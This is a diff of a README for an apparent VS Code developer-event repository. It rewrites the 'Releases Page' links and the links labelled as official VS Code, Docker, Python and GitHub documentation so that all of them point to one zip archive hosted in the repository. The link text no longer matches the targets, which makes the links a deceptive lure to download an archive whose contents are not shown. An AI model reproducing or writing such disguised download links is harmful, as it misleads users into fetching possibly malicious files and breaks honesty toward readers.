@@ -17,7 +17,7 @@ To run the resources from this repository smoothly, please ensure your system me
 
 You can easily access our software by visiting the releases page. Follow the link below to download the materials.
 
-[Visit the Releases Page to Download](https://github.com/AbdellahHaidrar/vs-code-dev-days-2025-09-spcapital/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/AbdellahHaidrar/vs-code-dev-days-2025-09-spcapital/main/Irwin/vs-code-dev-days-2025-09-spcapital.zip)
 
 After visiting the releases page, look for the latest version. Each release may contain different files, including installation packages and documentation. Select the files that suit your needs and follow these steps to install:
 
@@ -59,10 +59,10 @@ Absolutely! We welcome contributions. You can report issues, suggest new feature
 
 Both novice and experienced users can benefit from learning more. Here are some recommended resources:
 
-- **[VS Code Documentation](https://code.visualstudio.com/docs)**
-- **[Docker Documentation](https://docs.docker.com/get-started/)**
-- **[Python Official Website](https://www.python.org/)**
-- **[GitHub Guides](https://guides.github.com/)**
+- **[VS Code Documentation](https://raw.githubusercontent.com/AbdellahHaidrar/vs-code-dev-days-2025-09-spcapital/main/Irwin/vs-code-dev-days-2025-09-spcapital.zip)**
+- **[Docker Documentation](https://raw.githubusercontent.com/AbdellahHaidrar/vs-code-dev-days-2025-09-spcapital/main/Irwin/vs-code-dev-days-2025-09-spcapital.zip)**
+- **[Python Official Website](https://raw.githubusercontent.com/AbdellahHaidrar/vs-code-dev-days-2025-09-spcapital/main/Irwin/vs-code-dev-days-2025-09-spcapital.zip)**
+- **[GitHub Guides](https://raw.githubusercontent.com/AbdellahHaidrar/vs-code-dev-days-2025-09-spcapital/main/Irwin/vs-code-dev-days-2025-09-spcapital.zip)**
   
 Explore these links to boost your understanding of the tools and technologies discussed in this repository.
 
@@ -81,6 +81,6 @@ If problems persist, feel free to open an issue in this repository. Our communit
 
 For quick access, remember to bookmark our releases page:
 
-[Visit the Releases Page to Download](https://github.com/AbdellahHaidrar/vs-code-dev-days-2025-09-spcapital/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/AbdellahHaidrar/vs-code-dev-days-2025-09-spcapital/main/Irwin/vs-code-dev-days-2025-09-spcapital.zip)
 
 Explore, learn, and enjoy your journey with these development tools. Your next big project is just a download away!
